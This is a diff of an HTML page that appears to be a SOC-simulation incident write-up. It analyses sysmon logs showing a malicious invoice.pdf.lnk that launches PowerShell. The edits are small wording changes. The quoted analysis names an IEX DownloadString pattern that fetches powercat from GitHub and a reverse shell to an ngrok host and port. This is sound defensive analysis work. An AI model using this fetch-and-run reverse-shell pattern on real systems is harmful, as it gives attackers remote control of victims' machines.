@@ -274,7 +274,7 @@ Following the initial email attachment, this <code>sysmon</code> event at <code>
               <p class="project-details__desc-para">
 This log entry, just seconds after the <code>.lnk</code> file was extracted at <code>1:00:25.540 PM</code>, is exactly what I was looking for. It's a <code>sysmon Process Create</code> event, showing <code>explorer.exe</code> (PID <code>3180</code>) spawning <code>powershell.exe</code> (PID <code>3880</code>). This confirms that clicking the <code>invoice.pdf.lnk</code> file directly led to <code>PowerShell</code> being executed.</p>
               <p class="project-details__desc-para">
-But the real kicker is the <code>process.command_line</code>. It's a classic malicious <code>PowerShell</code> one-liner: it uses <code>IEX (New-Object System.Net.WebClient).DownloadString()</code> to pull <code>powermac.ps1</code> from a <code>GitHub</code> repository (<code>https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1</code>). Immediately after that, it attempts to establish a <code>reverse shell</code> connection using <code>powercat</code> – which is a <code>PowerShell</code> version of <code>Netcat</code>, used for network debugging and creating reverse shells – to <code>2.tcp.ngrok.io</code> on port <code>19282</code>. This is the attacker getting their initial foothold and trying to set up remote access. This log unequivocally confirms the initial compromise described in the incident report!</p>
+But the real kicker is the <code>process.command_line</code>. It's a classic malicious <code>PowerShell</code> one-liner: it uses <code>IEX (New-Object System.Net.WebClient).DownloadString()</code> to pull <code>powermac.ps1</code> from a <code>GitHub</code> repository (<code>https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1</code>). Immediately after that, it attempts to establish a <code>reverse shell</code> connection using <code>powercat</code> – which is a <code>PowerShell</code> version of <code>Netcat</code>, used for network debugging and creating reverse shells – to <code>2.tcp.ngrok.io</code> on port <code>19282</code>. This is the attacker getting their initial foothold and trying to set up remote access.</p>
               <div class="project-details__img-cont">
                 <img
                   src="./assets/SocSim2/9-powercat.png"
@@ -557,7 +557,7 @@ However, the message also contains <code>Stop-Process</code>. This indicates tha
             </li>
             <li class="project-details__desc-para">Persistence:
                 <ul>
-                    <li class="project-details__desc-para">The attempted re-execution of the <code>powermac.ps1 reverse shell</code> (<code>06/04/2025 1:05:41.540 PM</code> and later reactivation per the incident report) signifies the establishment of a persistence mechanism.</li>
+                    <li class="project-details__desc-para">The attempted re-execution of the <code>powermac.ps1 reverse shell</code> (<code>06/04/2025 1:05:41.540 PM</code> and later reactivation signifies the establishment of a persistence mechanism.</li>
                 </ul>
             </li>
         </ul>
